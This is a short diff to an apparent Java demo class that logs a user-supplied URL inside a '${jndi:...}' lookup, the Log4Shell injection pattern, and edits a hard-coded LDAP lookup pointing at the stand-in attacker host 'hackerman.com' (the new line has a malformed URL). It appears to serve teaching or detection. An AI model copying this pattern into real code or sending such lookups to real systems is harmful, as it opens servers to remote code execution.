@@ -4,6 +4,6 @@ class Demo {
 
         String s = readUserURL();
         log.info("${jndi:" + s + "}");
-        log.info("${jndi:ldap:hackerman.com/hack.java}");
+        log.info("${jndi:ldap//:hackerman.com/hack.java}");
     }
 }
